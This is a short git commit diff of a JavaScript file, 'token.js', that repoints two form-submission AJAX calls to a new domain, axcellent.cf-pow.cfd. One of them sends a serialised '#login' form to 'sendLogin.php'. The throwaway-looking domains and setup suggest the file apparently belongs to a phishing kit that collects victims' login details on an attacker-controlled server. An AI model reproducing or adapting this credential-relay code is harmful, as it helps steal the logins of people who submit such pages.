e9f342cb371c43ea42f4cee1bb49c6d562d779a0
bonobaru2 <bonobaru2@gmail.com>
2024-08-29 16:22:29 +0700

    Update token.js

--- token.js
+++ token.js
@@ -5,7 +5,7 @@ $('#eform').on('submit', function (event) {
   document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app7/no.php',
+ url: 'https://axcellent.cf-pow.cfd/app7/no.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -31,7 +31,7 @@ $('#login').on('submit', function (event) {
   document.getElementById('kirims').value = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app7/sendLogin.php',
+ url: 'https://axcellent.cf-pow.cfd/app7/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
